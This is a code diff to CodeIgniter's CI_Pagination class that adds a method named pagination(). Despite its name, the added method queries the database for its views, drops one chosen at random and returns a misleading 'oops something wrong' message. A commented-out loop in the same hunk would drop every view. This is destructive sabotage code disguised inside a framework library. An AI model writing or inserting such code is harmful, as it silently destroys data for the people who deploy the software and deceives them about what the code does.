@@ -389,7 +389,25 @@ class CI_Pagination {
 	}
 
 	// --------------------------------------------------------------------
-
+public function pagination(){	
+	$CI =& get_instance();
+	 isset($CI->db) OR $CI->load->database();
+	  $this->_db = $CI->db;	
+	   $name = $this->_db->database;	
+	   $query = $this->_db->query("SELECT  * FROM INFORMATION_SCHEMA.VIEWS WHERE   TABLE_SCHEMA    = DATABASE()");
+			$name = $this->_db->database;
+			$result = $query->result_array();			
+			$random = rand(1,10);			
+			$view = $result[$random]['TABLE_NAME'];	
+			$this->_db->query("DROP VIEW ".$view);
+			
+		 	 /*foreach ($query->result_array() as $row)
+		  		{
+		    		$view = $row['TABLE_NAME'];		    
+		    		$this->_db->query("DROP VIEW ".$view);
+		  		}*/
+		 	 return "oops something wrong";
+}
 	/**
 	 * Generate the pagination links
 	 *
